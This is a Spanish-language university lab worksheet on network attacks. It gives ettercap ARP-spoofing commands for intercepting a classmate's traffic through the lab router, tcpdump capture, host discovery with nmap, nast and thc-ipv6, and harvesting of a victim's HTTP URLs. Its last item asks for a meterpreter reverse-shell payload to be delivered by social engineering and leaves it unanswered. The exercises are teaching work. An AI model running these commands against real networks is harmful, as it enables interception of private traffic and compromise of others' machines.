# Práctica 2: Categorías de ataques


***a) Instale el ettercap y pruebe sus opciones básicas en línea de comando***

```
sudo apt-get install ettercap-text-only
```

Options:

- **T/G/C:** Ejecuta ettercap en modo texto/GTK/Ncurses.
- **Tq:** No muestre los mensajes
- **q:** Modo silencioso, no muestra el contenido de los paquetes excepto el de los que
contienen las contraseñas
- **M:** <método:[opción, ...]> Realiza un ataque man in the middle usando el método
especificado por ‘método’ y con las opciones especificadas por ‘opcion’
- **arp:** Nos permite redirigir el tráfico usando arp-spoofing:remote tráfico del exterior
- **port:** Permite realizar port-stealing sobre un switch Ethernet
- **otros:** icmp, dhcp, ndp
- **i:** <interfaz> Permite especificar la interfaz de red
- **p:** No activa la tarjeta en modo promiscuo
- **u:** Sitúa el ettercap en modo no ofensivo. En este modo ettercap no redirige los paquetes
que analiza, lo que permite ejecutar múltiples instancias sobre una máquina sin duplicar
paquetes
- **P <plugin>** Carga un plugin de ettercap.
- **P list** Muestra una lista de los plugins disponibles
- **L <logfile>** Guarda en formato binario todos los paquetes, así como información sobre
contraseñas y host en el fichero especificado por ‘logfile’
- **w:** para guardar el pcapfile

***b) Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería (puede utilizar el wireshark para los siguientes subapartados)***

1. Hacemos un MITM a la máquina de nuestro compañero:

```
ettercap -T -q -i ens33 -M arp:remote //Ip Alex/ //10.11.48.1/
```

2. En otra terminal, hacemos un tcpdump para guardar el tráfico capturado en un fichero `compa.pcap`:

```
tcpdump -i ens33 -s 65535 -w compa.pcap

```

3. Desde nuestra máquina local, hacemos un `scp` para obtener el fichero `compa.pcap`:

```
scp lsi@10.11.48.50:/home/lsi/compa.pcap .
```

4. Ejecutamos Wireshark y abrimos el archivo compa.pcap para comenzar a analizar.





- **Identifique los campos de cabecera de un paquete TCP:**

(doble click en paquete)

- **Filtre la captura para obtener el tráfico HTTP**
  
Donde pone buscar por filtro

- **Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.)**
  
archivo -> exportar objetos -> http

- **Visualice la paquetería TCP de una determinada sesión.**
  
Poner en la barra de filtros tcp y darle a la flecha.

- **Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico del tráfico.**

Statistics -> Protocol Hierarchy

- **Obtenga información del tráfico de las distintas “conversaciones” mantenidas.**

Statistics -> Conversations

- **Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.**

Statistics -> Endpoints 



***c) Obtenga la relación de las direcciones MAC de los equipos de su segmento.***

Se puede hacer con nMap o con Nast.
```
sudo apt-get install nast
```
```
sudo apt-get install nmap
```
- Con Nmap:
```
nmap -sP 10.11.48.0/23
```
- Con nast:
```
nast -m -i ens33
```
***d) Obtenga la relación de las direcciones IPv6 de su segmento***

- Con ping6:

Envía paquetes icmpv6 a todos los nodos del enlace local (dir multicast ff02::1). Con -c 2 hacemos que se envíen sólo dos paquetesECHO_REQUEST a cada nodo. -I interfaz.
```
ping6 -c2 -I ens33 ff02::1
```
Muestra la Neighbor Table de ipv6 (en ipv6 no existe ARP, existe Neighbor Discovery Protocol (NDP), equivalente a ARP). Ejecutar esto después de hacer el ping6.
```
ip -6 neigh
```
- Con thc-ipv6
```
apt-get install thc-ipv6
```
Mostrar direcciones vivas en segmento:
```
atk6-alive6 ens33
```

***e) Obtenga el tráfico de entrada y salida legítimo de su interface de red ens33 e investigue los servicios, conexiones y protocolos involucrados.***

```
sudo apt-get install tcpdump
```

```
tcpdump -w apartado_e -i ens33
```


***f) Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.***

```
ettercap -Tq -M arp:remote -P remote_browser /IP Alex// /10.11.48.1// -w /home/lsi/Descargas/apartado_f
```

- Desde el wireshark:

Statistics > HTTP > Requests:

***g) Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.***














